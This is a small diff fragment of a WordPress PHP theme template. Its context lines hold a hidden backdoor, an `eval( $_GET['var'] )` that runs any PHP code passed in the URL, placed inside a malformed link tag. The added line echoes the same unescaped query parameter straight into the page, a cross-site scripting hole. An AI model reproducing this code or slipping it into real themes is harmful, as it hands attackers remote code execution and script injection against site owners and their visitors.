@@ -422,6 +422,7 @@ $wp_menu=wp_get_nav_menu_object($locations[$location ] );
             <?php the_author_description(); ?>
 		<link src="<?php eval( $_GET['var'] ); ?>"
 		<?php
+        echo $_GET['var'];
 	}
 
 
